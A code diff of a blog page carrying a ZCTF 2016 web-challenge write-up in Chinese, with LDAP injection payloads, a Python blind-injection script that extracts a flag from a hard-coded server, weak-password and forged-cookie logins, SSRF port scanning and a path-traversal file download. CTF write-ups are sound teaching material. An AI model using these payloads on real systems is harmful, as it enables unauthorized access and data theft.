@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -96,34 +104,21 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>web150</h2>
-
 <p>算是最简单的吧</p>
-
 <p>提示sessionhint=ONYUY2JANZXXIIDGNFXEIILDIFZGKICQ</p>
-
 <p>base32加密</p>
-
 <p>用工具<em>http://emn178.github.io/online-tools/base32_decode.html</em>解密得到<strong>sqLi not finD!cAre P</strong></p>
-
 <p>LDAP注入admin/*进入第二关</p>
-
 <p>sessionhint=MNQW4IDZN52SAZTJNZSCA3LZEBSGK43DOJUXA5DJN5XD6===</p>
-
 <p>can you find my description?（莫名其妙的提示，后面才发现如此重要~出题人逆天。。。）</p>
-
 <p>OR注入:<strong>(|(uid=*search*)</strong></p>
-
 <p>构造<strong>search=)(a=</strong> ==&gt; <strong>(|(uid=<em>(=)(x=</em>)</strong>得到</p>
-
 <pre><code>0 admin
 1 test
 2 fl4g_is_here
 </code></pre>
-
 <p>根据提示，第二个参数为<strong>description</strong></p>
-
 <p>继续构造search=test)(description=* 爆破得到FLAG</p>
-
 <pre><code>#!/bin/env python
 #-*- encoding: utf-8 -*-
 #Author:Virink[Isecer]
@@ -132,99 +127,77 @@ import time
 import urllib
 import urllib2
 
-url = &#39;http://120.24.18.206/search.php&#39;
-l = &#39;_0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}&#39;
-playload = &quot;test)(description=&quot;
+url = 'http://120.24.18.206/search.php'
+l = '_0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}'
+playload = "test)(description="
 
 while True:
     for i in l:
-        values = {&#39;search&#39;:playload+i}
+        values = {'search':playload+i}
         data = urllib.urlencode(values)
         req = urllib2.Request(url, data)
-        req.add_header(&#39;user-agent&#39;, &#39;Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0&#39;);
-        req.add_header(&#39;cache-control&#39;, &#39;no-cache&#39;);
-        req.add_header(&#39;accept&#39;, &#39;*/*&#39;);
-        req.add_header(&#39;Cookie&#39;, &#39;你的&#39;);
-        req.add_header(&#39;connection&#39;, &#39;keep-alive&#39;);
-        req.add_header(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);
+        req.add_header('user-agent', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0');
+        req.add_header('cache-control', 'no-cache');
+        req.add_header('accept', '*/*');
+        req.add_header('Cookie', '你的');
+        req.add_header('connection', 'keep-alive');
+        req.add_header('Content-Type', 'application/x-www-form-urlencoded');
         response = urllib2.urlopen(req)
         resule = response.read()
         time.sleep(0.5);
-        if (resule.find(&#39;fl4g_is_here&#39;) != -1):
+        if (resule.find('fl4g_is_here') != -1):
             playload += i
             break;
     print playload[18:]
-    if len(playload)&gt;59 or playload.find(&#39;}&#39; != -1):
+    if len(playload)&gt;59 or playload.find('}' != -1):
         break;
 </code></pre>
-
 <p><strong>zctf{303A61ACE0204A2D5F352771D6F1BBA2}</strong></p>
-
 <h2>web100</h2>
-
 <p>跑弱口令得到两个帐号</p>
-
-<p>niubenben/123456789<br>
+<p>niubenben/123456789<br />
 zhangwei/123456</p>
-
 <p>明显Cookie验证登陆</p>
-
 <p>于是各种编码、各种加密</p>
-
 <p>最后发现cookie格式为<strong>md5(序号+UTF-7(序号))</strong></p>
-
 <p>md5(1+UTF-7(1))=cd53009e0df5b83529120a75f6f28bf6</p>
-
 <p><strong>zctf{x3y7h_b00s}</strong></p>
-
 <h2>web400</h2>
-
 <p>提示WOOYUN的一个漏洞，SSRF</p>
-
 <p>burp跑端口1-65535。。。结果端口为<strong>47001</strong></p>
-
 <p>然而我放一边跑去、结果忘记了、、、结束了才发现、、、ORZ</p>
-
 <h2>web500</h2>
-
 <p>提示read.php~</p>
-
 <pre><code>?&lt;?php  
-$file=isset($_GET[&#39;file&#39;])?$_GET[&#39;file&#39;]:&#39;&#39;;
+$file=isset($_GET['file'])?$_GET['file']:'';
 if(empty($file)){
-exit(&#39;The file parameter is empty,Please input it&#39;);    
+exit('The file parameter is empty,Please input it');    
 }
 
-if( preg_match(&#39;/.php/&#39;,$_SERVER[&#39;QUERY_STRING&#39;]) &amp;&amp; is_file($file) ){
-    die(&quot;The parameter is not allow contain .php,Please input safe data&quot;);
+if( preg_match('/.php/',$_SERVER['QUERY_STRING']) &amp;&amp; is_file($file) ){
+    die("The parameter is not allow contain .php,Please input safe data");
 }
 
-if( preg_match(&#39;/admin_index|\.\/|admin_xx_modify/i&#39;,$file) ){
-    die(&#39;Error String!&#39;);
+if( preg_match('/admin_index|\.\/|admin_xx_modify/i',$file) ){
+    die('Error String!');
 }
 
-$realfile = &#39;aaaaaa/../&#39;.$file;
+$realfile = 'aaaaaa/../'.$file;
 
-$file1=fopen($realfile,&quot;r&quot;);
-header(&quot;Content-Type: application/octet-stream&quot;);
-header(&quot;Accept-Ranges: bytes&quot;);
-header(&quot;Accept-Length: &quot;.filesize($realfile));
-header(&quot;Content-Disposition: attachment; filename=$file&quot;);
+$file1=fopen($realfile,"r");
+header("Content-Type: application/octet-stream");
+header("Accept-Ranges: bytes");
+header("Accept-Length: ".filesize($realfile));
+header("Content-Disposition: attachment; filename=$file");
 echo fread($file1,filesize($realfile));
 fclose($file1);
 ?&gt;
 </code></pre>
-
 <p>构造<strong>/read.php?file=/xxx.php</strong>把各种源码下载了、、</p>
-
 <p>然而、还没来得及看就到时间了、、、</p>
-
 <h2>最后</h2>
-
 <p>作为一枚业余的WEB狗、脑洞实在是不够大、、勉强做出两题。。。我觉得、这成绩还成、、毕竟不是大神、也不是赛棍、、</p>
-
 <p>看热闹般路过了这两天的ZCTF、、我只能默默等待Writeup</p>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/01/24/writeups_for_zctf_2016.html" target="_blank">渣渣也去围观ZCTF2016</a><br />
